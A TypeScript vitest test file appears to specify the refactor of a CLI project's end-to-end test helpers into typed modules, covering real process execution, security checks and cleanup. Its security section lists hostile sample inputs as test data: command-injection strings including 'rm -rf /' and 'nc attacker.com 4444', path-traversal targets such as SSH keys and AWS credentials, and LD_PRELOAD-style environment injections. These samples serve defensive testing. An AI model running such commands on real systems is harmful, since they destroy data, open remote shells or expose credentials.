import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { promises as fs } from "fs";
import path from "path";
import os from "os";
import { spawn } from "child_process";

// These imports SHOULD exist after refactoring but WILL FAIL initially
import type {
  CliExecutor,
  TestEnvironment,
  WorkflowValidator,
  UserSimulator,
  SecurityValidator,
  ProcessManager,
} from "../utils/e2e-types.js";

// These imports SHOULD be the new modular structure but WILL FAIL initially
import { createCliExecutor } from "../utils/cli-executor.js";
import { createTestEnvironment } from "../utils/test-environment.js";
import { createWorkflowValidator } from "../utils/workflow-validator.js";
import { createUserSimulator } from "../utils/user-simulator.js";
import { createSecurityValidator } from "../utils/security-validator.js";
import { createProcessManager } from "../utils/process-manager.js";

// Test constants
const MODULE_SIZE_LIMIT = 300;
const FUNCTION_SIZE_LIMIT = 50;
const MAX_CYCLOMATIC_COMPLEXITY = 3;
const CLI_PATH = path.resolve("./bin/cli.js");
const TEST_TIMEOUT_MS = 10000;

// Global test environment available to all describe blocks
let testEnvironment: TestEnvironment;

describe("REQ-200 — E2E Infrastructure TypeScript Migration", () => {
  beforeEach(async () => {
    // This SHOULD create a properly typed test environment but WILL FAIL initially
    testEnvironment = await createTestEnvironment();
  });

  afterEach(async () => {
    if (testEnvironment) {
      await testEnvironment.cleanup();
    }
  });

  test("REQ-200 — e2e-helpers converted to TypeScript with proper interfaces", async () => {
    // Test that the original JS file has been migrated to TS modules
    const originalJsFile = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/e2e-helpers.js";
    const jsFileExists = await fs.access(originalJsFile).then(() => true).catch(() => false);
    
    // JS file should NOT exist after migration
    expect(jsFileExists).toBe(false);

    // TypeScript modules SHOULD exist
    const expectedModules = [
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/test-environment.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/workflow-validator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/user-simulator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/process-manager.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/e2e-types.ts",
    ];

    for (const modulePath of expectedModules) {
      const moduleExists = await fs.access(modulePath).then(() => true).catch(() => false);
      expect(moduleExists).toBe(true);
    }
  });

  test("REQ-200 — TypeScript compilation succeeds with strict type checking", async () => {
    // Test TypeScript compilation with strict settings
    const tsconfigPath = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/tsconfig.json";
    const tsconfigExists = await fs.access(tsconfigPath).then(() => true).catch(() => false);
    expect(tsconfigExists).toBe(true);

    // Run TypeScript compiler check
    const tscResult = await new Promise<{code: number, output: string}>((resolve) => {
      const tsc = spawn("npx", ["tsc", "--noEmit", "--strict"], {
        stdio: "pipe",
        timeout: TEST_TIMEOUT_MS,
      });

      let output = "";
      tsc.stdout?.on("data", (data) => (output += data.toString()));
      tsc.stderr?.on("data", (data) => (output += data.toString()));
      
      tsc.on("close", (code) => resolve({ code: code || 0, output }));
    });

    expect(tscResult.code).toBe(0);
    expect(tscResult.output).not.toContain("error");
  });

  test("REQ-200 — interfaces provide proper type safety for all E2E operations", async () => {
    // Test that interfaces are properly defined and enforce type safety
    const typesFile = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/e2e-types.ts";
    const typesContent = await fs.readFile(typesFile, "utf-8");

    // Check for required interface definitions
    const requiredInterfaces = [
      "interface CliExecutor",
      "interface TestEnvironment", 
      "interface WorkflowValidator",
      "interface UserSimulator",
      "interface SecurityValidator",
      "interface ProcessManager",
      "interface WorkflowStep",
      "interface ExecutionResult",
      "interface ValidationResult",
    ];

    for (const interfaceDecl of requiredInterfaces) {
      expect(typesContent).toContain(interfaceDecl);
    }
  });
});

describe("REQ-201 — E2E Architecture Decomposition", () => {
  test("REQ-201 — monolithic file decomposed into focused modules under size limits", async () => {
    const modulePaths = [
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/test-environment.ts", 
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/workflow-validator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/user-simulator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/process-manager.ts",
    ];

    for (const modulePath of modulePaths) {
      const content = await fs.readFile(modulePath, "utf-8");
      const lineCount = content.split("\n").length;
      
      expect(lineCount).toBeLessThanOrEqual(MODULE_SIZE_LIMIT);
    }
  });

  test("REQ-201 — all functions maintain size limit and low cyclomatic complexity", async () => {
    const modulePaths = [
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/test-environment.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/workflow-validator.ts",
    ];

    for (const modulePath of modulePaths) {
      const content = await fs.readFile(modulePath, "utf-8");
      
      // Extract function declarations and check their size
      const functionMatches = content.matchAll(/(?:export\s+)?(?:async\s+)?function\s+\w+[^{]*\{/g);
      
      for (const match of functionMatches) {
        const functionStart = match.index!;
        const functionContent = extractFunction(content, functionStart);
        const functionLines = functionContent.split("\n").length;
        
        expect(functionLines).toBeLessThanOrEqual(FUNCTION_SIZE_LIMIT);
        
        // Basic cyclomatic complexity check (count decision points)
        const complexity = calculateCyclomaticComplexity(functionContent);
        expect(complexity).toBeLessThanOrEqual(MAX_CYCLOMATIC_COMPLEXITY);
      }
    }
  });

  test("REQ-201 — proper separation of concerns between modules", async () => {
    // CLI Executor should only handle process execution
    const cliExecutor = await createCliExecutor();
    expect(typeof cliExecutor.execute).toBe("function");
    expect(typeof cliExecutor.spawn).toBe("function");
    expect(cliExecutor.execute.length).toBeGreaterThanOrEqual(2); // args and options

    // Test Environment should only handle test setup/teardown
    const testEnv = await createTestEnvironment();
    expect(typeof testEnv.setup).toBe("function");
    expect(typeof testEnv.teardown).toBe("function");
    expect(typeof testEnv.createTempDir).toBe("function");

    // Workflow Validator should only handle validation logic
    const validator = await createWorkflowValidator();
    expect(typeof validator.validateWorkflow).toBe("function");
    expect(typeof validator.validateSteps).toBe("function");
    
    // Each module should have a single, focused responsibility
    expect(Object.keys(cliExecutor)).toEqual(["execute", "spawn", "kill", "cleanup"]);
    expect(Object.keys(testEnv)).toEqual(["setup", "teardown", "createTempDir", "cleanup"]);
    expect(Object.keys(validator)).toEqual(["validateWorkflow", "validateSteps", "validateExpectations"]);
  });
});

describe("REQ-202 — Real CLI Process Execution", () => {
  let cliExecutor: CliExecutor;
  let processManager: ProcessManager;

  beforeEach(async () => {
    cliExecutor = await createCliExecutor();
    processManager = await createProcessManager();
    if (!testEnvironment) {
      testEnvironment = await createTestEnvironment();
    }
  });

  afterEach(async () => {
    if (testEnvironment) {
      await testEnvironment.cleanup();
    }
  });

  test("REQ-202 — CLI executor uses real subprocess execution, not simulation", async () => {
    // Test that simulation code has been removed
    const cliExecutorPath = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.ts";
    const content = await fs.readFile(cliExecutorPath, "utf-8");
    
    // Simulation methods should NOT exist
    expect(content).not.toContain("simulateCliExecution");
    expect(content).not.toContain("simulateFirstTimeUser");
    expect(content).not.toContain("Promise.resolve({");
    expect(content).not.toContain("code: 0"); // Hardcoded success responses
    
    // Real subprocess execution should exist
    expect(content).toContain("spawn");
    expect(content).toContain("child_process");
  });

  test("REQ-202 — real CLI commands execute with actual file system validation", async () => {
    const testArgs = ["--help"];
    const testOptions = { cwd: os.tmpdir(), timeout: 5000 };
    
    // This should execute real CLI command
    const result = await cliExecutor.execute(testArgs, testOptions);
    
    // Result should be from real CLI execution
    expect(result.code).toBeTypeOf("number");
    expect(result.stdout).toBeTypeOf("string");
    expect(result.stderr).toBeTypeOf("string");
    expect(result.duration).toBeGreaterThan(0);
    
    // Should NOT have simulation artifacts
    expect(result.stdout).not.toContain("Simulated");
    expect(result.stdout).not.toContain("Mock");
  });

  test("REQ-202 — real filesystem operations replace mocked directory creation", async () => {
    const tempDir = await testEnvironment.createTempDir();
    const testConfigPath = path.join(tempDir, ".claude", "claude_desktop_config.json");
    
    // Execute real init command
    const initResult = await cliExecutor.execute(["init", tempDir], { timeout: 10000 });
    
    // Verify real filesystem changes occurred
    const dirExists = await fs.access(path.dirname(testConfigPath)).then(() => true).catch(() => false);
    const fileExists = await fs.access(testConfigPath).then(() => true).catch(() => false);
    
    expect(dirExists).toBe(true);
    expect(fileExists).toBe(true);
    
    // Verify real content, not simulated
    const configContent = await fs.readFile(testConfigPath, "utf-8");
    const config = JSON.parse(configContent);
    expect(config).toHaveProperty("mcpServers");
    expect(typeof config.mcpServers).toBe("object");
  });

  test("REQ-202 — npm package validation uses real npm ecosystem", async () => {
    // Test that npm commands are executed against real npm registry
    const npmTestResult = await cliExecutor.execute(["npm", "--version"], { timeout: 5000 });
    
    expect(npmTestResult.code).toBe(0);
    expect(npmTestResult.stdout).toMatch(/\d+\.\d+\.\d+/); // Real version number
    
    // Test package existence check uses real npm
    const packageCheckResult = await cliExecutor.execute([
      "npm", "view", "@modelcontextprotocol/server-github", "version"
    ], { timeout: 10000 });
    
    expect(packageCheckResult.code).toBe(0);
    expect(packageCheckResult.stdout).toMatch(/\d+\.\d+\.\d+/);
  });
});

describe("REQ-203 — Security Hardening", () => {
  let securityValidator: SecurityValidator;

  beforeEach(async () => {
    securityValidator = await createSecurityValidator();
    if (!testEnvironment) {
      testEnvironment = await createTestEnvironment();
    }
  });

  afterEach(async () => {
    if (testEnvironment) {
      await testEnvironment.cleanup();
    }
  });

  test("REQ-203 — command injection prevention in CLI execution", async () => {
    const maliciousInputs = [
      "; rm -rf /",
      "&& cat /etc/passwd", 
      "| nc attacker.com 4444",
      "`curl malicious.com`",
      "$(rm -rf .)",
      "\"; DROP TABLE users; --",
    ];

    for (const maliciousInput of maliciousInputs) {
      // Security validator should detect and prevent injection
      const isSecure = await securityValidator.validateCommand(["init", maliciousInput]);
      expect(isSecure.safe).toBe(false);
      expect(isSecure.threats).toContain("command_injection");
      
      // CLI executor should sanitize or reject malicious input
      await expect(
        createCliExecutor().then(executor => executor.execute(["init", maliciousInput]))
      ).rejects.toThrow(/unsafe.*command/i);
    }
  });

  test("REQ-203 — path traversal protection in filesystem operations", async () => {
    const maliciousPaths = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config",
      "/etc/shadow",
      "~/.ssh/id_rsa",
      "/root/.aws/credentials",
    ];

    for (const maliciousPath of maliciousPaths) {
      // Security validator should detect path traversal attempts
      const pathCheck = await securityValidator.validatePath(maliciousPath);
      expect(pathCheck.safe).toBe(false);
      expect(pathCheck.threats).toContain("path_traversal");
      
      // Test environment should reject dangerous paths
      await expect(
        testEnvironment.createTempDir(maliciousPath)
      ).rejects.toThrow(/unsafe.*path/i);
    }
  });

  test("REQ-203 — environment variable sanitization prevents injection", async () => {
    const maliciousEnvVars = {
      NODE_OPTIONS: "--inspect=0.0.0.0:9229 --require ./malicious.js",
      PATH: "/malicious/bin:" + process.env.PATH,
      LD_PRELOAD: "/tmp/malicious.so",
      DYLD_INSERT_LIBRARIES: "/tmp/malicious.dylib",
    };

    for (const [key, value] of Object.entries(maliciousEnvVars)) {
      // Security validator should detect malicious environment variables
      const envCheck = await securityValidator.validateEnvironment({ [key]: value });
      expect(envCheck.safe).toBe(false);
      expect(envCheck.threats).toContain("env_injection");
      
      // CLI executor should sanitize environment
      const executor = await createCliExecutor();
      await expect(
        executor.execute(["--help"], { env: { [key]: value } })
      ).rejects.toThrow(/unsafe.*environment/i);
    }
  });

  test("REQ-203 — input validation prevents buffer overflow and format string attacks", async () => {
    const attackInputs = [
      "A".repeat(10000), // Buffer overflow attempt
      "%s%s%s%s%s%s%s%s", // Format string attack
      "\x00\x01\x02\x03", // Null bytes and control characters
      "\n\r\t" + "A".repeat(1000), // Mixed line breaks with large input
    ];

    for (const attackInput of attackInputs) {
      const inputCheck = await securityValidator.validateInput(attackInput);
      expect(inputCheck.safe).toBe(false);
      expect(inputCheck.threats.length).toBeGreaterThan(0);
    }
  });
});

describe("REQ-204 — TDD Compliance for E2E Fixes", () => {
  test("REQ-204 — all functions have corresponding failing tests before implementation", async () => {
    const moduleFiles = [
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/test-environment.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/workflow-validator.ts",
    ];

    for (const moduleFile of moduleFiles) {
      const moduleContent = await fs.readFile(moduleFile, "utf-8");
      const testFileName = moduleFile.replace(".ts", ".spec.ts");
      
      // Every module should have corresponding test file
      const testFileExists = await fs.access(testFileName).then(() => true).catch(() => false);
      expect(testFileExists).toBe(true);
      
      // Test file should test every exported function
      const testContent = await fs.readFile(testFileName, "utf-8");
      const exportedFunctions = moduleContent.match(/export\s+(async\s+)?function\s+(\w+)/g) || [];
      
      for (const exportedFunction of exportedFunctions) {
        const functionName = exportedFunction.match(/function\s+(\w+)/)?.[1];
        if (functionName) {
          // Test should exist for this function
          expect(testContent).toMatch(new RegExp(`describe.*${functionName}|test.*${functionName}`));
        }
      }
    }
  });

  test("REQ-204 — test coverage validates all critical paths with REQ ID references", async () => {
    // Check that tests reference requirement IDs in titles
    const testFiles = [
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/cli-executor.spec.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.spec.ts",
      "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/process-manager.spec.ts",
    ];

    const requiredREQs = ["REQ-200", "REQ-201", "REQ-202", "REQ-203", "REQ-204", "REQ-205"];
    
    for (const testFile of testFiles) {
      const testContent = await fs.readFile(testFile, "utf-8");
      
      // At least one REQ ID should be referenced
      const hasREQReference = requiredREQs.some(req => testContent.includes(req));
      expect(hasREQReference).toBe(true);
    }
  });

  test("REQ-204 — failing tests created before implementation for each PE-Reviewer finding", async () => {
    // This test verifies that failing tests exist for specific PE findings
    const peFindings = [
      "monolithic_architecture",
      "simulation_instead_of_real_execution", 
      "poor_error_handling",
      "security_vulnerabilities",
      "resource_leaks",
    ];

    for (const finding of peFindings) {
      // Should have specific test that initially fails for each finding
      const testPattern = new RegExp(`test.*${finding}|describe.*${finding}`, "i");
      
      // Check across all test files
      let foundTest = false;
      const testFiles = await fs.readdir("/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils");
      
      for (const file of testFiles) {
        if (file.endsWith(".spec.ts")) {
          const content = await fs.readFile(`/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/${file}`, "utf-8");
          if (testPattern.test(content)) {
            foundTest = true;
            break;
          }
        }
      }
      
      expect(foundTest).toBe(true);
    }
  });
});

describe("REQ-205 — Error Handling and Resource Management", () => {
  let processManager: ProcessManager;

  beforeEach(async () => {
    processManager = await createProcessManager();
    if (!testEnvironment) {
      testEnvironment = await createTestEnvironment();
    }
  });

  afterEach(async () => {
    if (testEnvironment) {
      await testEnvironment.cleanup();
    }
  });

  test("REQ-205 — process cleanup prevents hanging processes in test environment", async () => {
    const testProcess = await processManager.spawn("sleep", ["10"], { timeout: 1000 });
    
    // Process should be tracked
    expect(processManager.getActiveProcesses()).toContain(testProcess.pid);
    
    // Timeout should kill the process
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Process should be cleaned up
    expect(processManager.getActiveProcesses()).not.toContain(testProcess.pid);
    
    // Process should be properly terminated (not zombie)
    const processExists = await processManager.isProcessActive(testProcess.pid);
    expect(processExists).toBe(false);
  });

  test("REQ-205 — file cleanup prevents resource leaks", async () => {
    const tempFiles = [];
    
    // Create multiple temporary files
    for (let i = 0; i < 5; i++) {
      const tempFile = await testEnvironment.createTempFile(`test-file-${i}.txt`);
      tempFiles.push(tempFile);
    }
    
    // All files should exist
    for (const file of tempFiles) {
      const exists = await fs.access(file).then(() => true).catch(() => false);
      expect(exists).toBe(true);
    }
    
    // Cleanup should remove all files
    await testEnvironment.cleanup();
    
    // All files should be removed
    for (const file of tempFiles) {
      const exists = await fs.access(file).then(() => true).catch(() => false);
      expect(exists).toBe(false);
    }
  });

  test("REQ-205 — comprehensive error recovery for filesystem operations", async () => {
    const errorScenarios = [
      { type: "permission_denied", setup: () => fs.chmod(path.join(os.tmpdir(), "test-restricted"), 0o000) },
      { type: "disk_full", setup: () => Promise.resolve() }, // Simulated
      { type: "network_timeout", setup: () => Promise.resolve() }, // Simulated
      { type: "invalid_config", setup: () => fs.writeFile("/tmp/invalid.json", "{ invalid }") },
    ];

    for (const scenario of errorScenarios) {
      await scenario.setup();
      
      // Error should be handled gracefully
      const recovery = await processManager.handleError(scenario.type);
      expect(recovery.recovered).toBe(true);
      expect(recovery.cleanup).toBe(true);
      expect(recovery.resourcesReleased).toBe(true);
    }
  });

  test("REQ-205 — race condition prevention in concurrent test execution", async () => {
    const concurrentOperations = [];
    const resourceId = "shared-test-resource";
    
    // Launch concurrent operations that compete for the same resource
    for (let i = 0; i < 10; i++) {
      concurrentOperations.push(
        testEnvironment.acquireResource(resourceId).then(resource => {
          return new Promise(resolve => {
            setTimeout(() => {
              testEnvironment.releaseResource(resourceId);
              resolve(resource);
            }, Math.random() * 100);
          });
        })
      );
    }
    
    // Wait for all operations to complete
    const results = await Promise.all(concurrentOperations);
    
    // All operations should succeed (no race conditions)
    expect(results).toHaveLength(10);
    results.forEach(result => expect(result).toBeDefined());
    
    // Resource should be properly released
    const isResourceActive = await testEnvironment.isResourceActive(resourceId);
    expect(isResourceActive).toBe(false);
  });
});

// Helper functions for tests (will also need to be implemented)
function extractFunction(content: string, startIndex: number): string {
  let braceCount = 0;
  let inFunction = false;
  let functionContent = "";
  
  for (let i = startIndex; i < content.length; i++) {
    const char = content[i];
    functionContent += char;
    
    if (char === "{") {
      braceCount++;
      inFunction = true;
    } else if (char === "}") {
      braceCount--;
      if (inFunction && braceCount === 0) {
        break;
      }
    }
  }
  
  return functionContent;
}

function calculateCyclomaticComplexity(functionContent: string): number {
  const decisionPoints = [
    /\bif\b/g,
    /\belse\b/g,
    /\bwhile\b/g,
    /\bfor\b/g,
    /\bswitch\b/g,
    /\bcase\b/g,
    /\bcatch\b/g,
    /\b\?\b/g, // Ternary operator
    /\b&&\b/g,
    /\b\|\|\b/g,
  ];
  
  let complexity = 1; // Base complexity
  
  for (const pattern of decisionPoints) {
    const matches = functionContent.match(pattern) || [];
    complexity += matches.length;
  }
  
  return complexity;
}